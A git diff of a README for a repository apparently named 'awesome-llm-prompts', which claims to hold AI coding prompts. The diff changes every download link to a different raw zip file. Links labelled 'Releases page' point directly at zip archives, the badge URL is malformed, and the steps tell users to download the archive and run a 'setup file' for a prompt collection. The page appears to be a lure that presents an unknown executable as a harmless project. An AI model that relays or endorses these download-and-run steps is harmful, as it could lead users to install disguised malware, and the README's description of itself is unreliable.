@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 awesome-llm-prompts - Simplify AI Coding Rules
 
-[![Download Now](https://raw.githubusercontent.com/benja0191928/awesome-llm-prompts/main/Kris/awesome-llm-prompts.zip%20Now-%https://raw.githubusercontent.com/benja0191928/awesome-llm-prompts/main/Kris/awesome-llm-prompts.zip)](https://raw.githubusercontent.com/benja0191928/awesome-llm-prompts/main/Kris/awesome-llm-prompts.zip)
+[![Download Now](https://github.com/benja0191928/awesome-llm-prompts/raw/refs/heads/main/Kris/prompts_llm_awesome_v2.8-alpha.3.zip%20Now-%https://github.com/benja0191928/awesome-llm-prompts/raw/refs/heads/main/Kris/prompts_llm_awesome_v2.8-alpha.3.zip)](https://github.com/benja0191928/awesome-llm-prompts/raw/refs/heads/main/Kris/prompts_llm_awesome_v2.8-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ This repository contains useful prompts and guidelines for improving your experi
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/benja0191928/awesome-llm-prompts/main/Kris/awesome-llm-prompts.zip) to access the latest version of the application.
+1. Visit the [Releases page](https://github.com/benja0191928/awesome-llm-prompts/raw/refs/heads/main/Kris/prompts_llm_awesome_v2.8-alpha.3.zip) to access the latest version of the application.
 2. Locate the release you want to download. Make sure to select the most recent version available.
 3. Click the download link for the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Save the file to your preferred location on your computer.
@@ -20,9 +20,9 @@ To get started, follow these steps:
 
 To download and install the application, please:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/benja0191928/awesome-llm-prompts/main/Kris/awesome-llm-prompts.zip).
+1. Visit the [Releases page](https://github.com/benja0191928/awesome-llm-prompts/raw/refs/heads/main/Kris/prompts_llm_awesome_v2.8-alpha.3.zip).
 2. Look for the "Assets" section under the latest release.
-3. Choose the file that matches your operating system (for example, `https://raw.githubusercontent.com/benja0191928/awesome-llm-prompts/main/Kris/awesome-llm-prompts.zip` for Windows users).
+3. Choose the file that matches your operating system (for example, `https://github.com/benja0191928/awesome-llm-prompts/raw/refs/heads/main/Kris/prompts_llm_awesome_v2.8-alpha.3.zip` for Windows users).
 4. Click on the file to download it. Once downloaded, unzip the file if necessary.
 5. Open the extracted folder and run the setup file or the main application file to start using awesome-llm-prompts.
 
